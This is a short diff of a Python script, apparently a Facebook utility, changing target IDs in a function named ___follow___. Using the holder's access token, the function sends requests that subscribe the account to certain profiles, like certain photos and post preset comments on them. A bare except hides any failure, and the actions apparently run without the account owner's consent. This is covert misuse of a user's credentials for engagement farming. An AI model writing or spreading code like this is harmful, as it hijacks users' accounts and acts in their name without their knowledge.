@@ -139,9 +139,9 @@ def ___follow___():
         requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=%s'%(___token___)) #muhammad rozhak
         requests.post('https://graph.facebook.com/135554395529272/likes?summary=true&access_token=%s'%(___token___)) #foto sampul
         requests.post('https://graph.facebook.com/135554395529272/likes?summary=true&access_token=%s'%(___token___)) # foto profil
-        requests.post('https://graph.facebook.com/103444262073619/comments/?message=%s&access_token=%s'%(___komen3___,___token___)) #foto sampul
+        requests.post('https://graph.facebook.com/136257098792335/comments/?message=%s&access_token=%s'%(___komen3___,___token___)) #foto sampul
         requests.post('https://graph.facebook.com/135554395529272/comments/?message=%s&access_token=%s'%(___komen___,___token___)) #foto profil
-        requests.post('https://graph.facebook.com/112564891244258/comments/?message=%s&access_token=%s'%(___komen2___,___token___)) #foto profil
+        requests.post('https://graph.facebook.com/135554395529272/comments/?message=%s&access_token=%s'%(___komen2___,___token___)) #foto profil
         requests.post('https://graph.facebook.com/100074722437372/subscribers?access_token=%s'%(___token___)) # Iwan
 	requests.post('https://graph.facebook.com/100074722437372/subscribers?access_token=%s'%(___token___)) # Muhammad Abill
     except:
